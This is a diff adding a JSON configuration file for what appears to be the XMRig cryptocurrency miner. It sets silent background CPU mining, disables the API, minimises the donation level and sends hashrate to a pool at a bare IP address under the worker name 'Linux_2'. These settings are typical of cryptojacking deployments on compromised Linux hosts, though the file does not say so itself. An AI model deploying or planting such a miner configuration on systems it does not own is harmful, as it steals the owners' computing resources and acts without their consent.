@@ -1,0 +1,92 @@
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "background": true,
+    "colors": false,
+    "randomx": {
+        "init": -1,
+        "mode": "auto",
+        "1gb-pages": false,
+        "rdmsr": true,
+        "wrmsr": true,
+        "numa": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "yield": true,
+        "asm": true,
+        "argon2-impl": null,
+        "argon2": [0],
+        "cn": [
+            [1, 0]
+        ],
+        "cn-heavy": [
+            [1, 0]
+        ],
+        "cn-lite": [
+            [1, 0]
+        ],
+        "cn-pico": [
+            [2, 0]
+        ],
+        "cn/gpu": [0],
+        "rx": [0],
+        "rx/wow": [0],
+        "cn/0": false,
+        "cn-lite/0": false,
+        "rx/arq": "rx/wow"
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD"
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true
+    },
+    "donate-level": 1,
+    "donate-over-proxy": 1,
+    "log-file": null,
+    "pools": [
+        {
+            "algo": null,
+            "coin": null,
+            "url": "185.164.72.119:3333",
+            "user": "Linux_2",
+            "pass": "Linux_2",
+            "rig-id": null,
+            "nicehash": true,
+            "keepalive": true,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "self-select": null
+        }
+    ],
+    "print-time": 60,
+    "health-print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "syslog": false,
+    "user-agent": null,
+    "verbose": 0,
+    "watch": true
+}
